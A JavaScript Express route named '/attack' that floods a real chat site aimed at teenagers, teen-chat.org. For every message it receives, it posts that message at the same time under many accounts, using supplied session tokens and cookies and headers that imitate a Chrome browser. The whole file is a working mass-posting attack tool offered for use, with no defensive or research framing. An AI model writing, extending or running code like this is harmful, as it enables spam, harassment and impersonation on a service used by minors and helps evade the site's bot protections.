import express from 'express';
import common from '../utils/common.js';

const router = express.Router();

router.post('/attack', async (req, res) => {
    const auths = req.body.auths;

    for (const message of req.body.messages) {
        const params = new URLSearchParams({ msg: message });
        const msg = params.toString().substring(4);

        await Promise.all(auths.map(auth => {
            const [token, cookie] = auth.split('|');

            fetch('https://www.teen-chat.org/teenchat/system/action/chat_process.php', {
                'headers': {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'priority': 'u=1, i',
                    'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'x-requested-with': 'XMLHttpRequest',
                    'cookie': cookie,
                    'Referer': 'https://www.teen-chat.org/teenchat/'
                },
                'body': `token=${token}&cp=chat&content=${msg}&quote=0`,
                'method': 'POST'
            })
        }));

        await common.wait(4);
    }

    res.sendStatus(200);
});

export default router;